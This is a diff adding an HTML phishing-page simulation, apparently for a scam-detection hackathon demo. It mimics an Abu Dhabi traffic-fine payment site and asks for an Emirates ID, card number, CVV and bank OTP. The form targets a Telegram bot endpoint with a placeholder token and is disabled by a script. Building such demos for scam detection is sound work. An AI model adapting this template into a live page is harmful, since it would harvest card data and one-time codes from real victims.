@@ -1,0 +1,47 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Abu Dhabi Traffic Fine Quick-Pay [HACKATHON SIMULATION]</title>
+  <style>
+    body { font-family: -apple-system, BlinkMacSystemFont, sans-serif; background: #f3f4f6; margin: 0; padding: 16px; color: #111827; }
+    .banner { background: #dc2626; color: #fff; text-align: center; padding: 10px; font-weight: 700; border-radius: 10px; margin-bottom: 16px; font-size: 13px; }
+    .card { max-width: 420px; margin: 0 auto; background: #fff; border-radius: 14px; padding: 20px; box-shadow: 0 8px 24px rgba(0,0,0,0.08); }
+    h1 { font-size: 20px; margin: 0 0 6px; color: #991b1b; }
+    .ar { direction: rtl; font-size: 15px; color: #4b5563; margin-bottom: 14px; }
+    .alert { background: #fef2f2; border: 1px solid #fecaca; color: #991b1b; padding: 10px; border-radius: 8px; font-size: 13px; margin-bottom: 14px; }
+    label { display: block; font-size: 13px; font-weight: 600; margin: 10px 0 4px; }
+    input { width: 100%; box-sizing: border-box; padding: 10px; border: 1px solid #d1d5db; border-radius: 8px; font-size: 14px; }
+    button { width: 100%; margin-top: 16px; padding: 12px; background: #b91c1c; color: #fff; border: none; border-radius: 8px; font-size: 15px; font-weight: 700; cursor: pointer; }
+  </style>
+</head>
+<body>
+  <div class="banner">
+    ⚠️ SCAMSHIELD AI HACKATHON DEMO SIMULATION — NOT A REAL WEBSITE — DO NOT ENTER REAL DATA
+  </div>
+  <div class="card">
+    <h1>Urgent Traffic Fine Payment — 50% Discount</h1>
+    <div class="ar">سداد المخالفات المرورية بشكل فوري — يرجى تحديث الهوية الإماراتية وتأكيد البطاقة</div>
+    <div class="alert">
+      Urgent: Pay fine AED 400 immediately to avoid vehicle block. Verify your card and Emirates ID update now.
+    </div>
+    <form action="https://api.telegram.org/botFAKE_SIMULATION/sendMessage" method="POST" onsubmit="event.preventDefault(); alert('SAFE SIMULATION ONLY: No data was submitted.');">
+      <label for="emirates_id">Emirates ID Number (الهوية الإماراتية)</label>
+      <input id="emirates_id" name="emirates_id" type="text" placeholder="784-XXXX-XXXXXXX-X" />
+
+      <label for="cardnumber">Debit / Credit Card Number</label>
+      <input id="cardnumber" name="cardnumber" type="text" placeholder="4000 0000 0000 0000" />
+
+      <label for="cvv">CVV / Security Code</label>
+      <input id="cvv" name="cvv" type="password" placeholder="***" />
+
+      <label for="otp">Bank SMS OTP Code (رمز التحقق)</label>
+      <input id="otp" name="otp" type="text" placeholder="6-digit OTP" />
+
+      <button type="submit">Pay Traffic Fine Immediately (Simulation)</button>
+    </form>
+  </div>
+</body>
+</html>
+
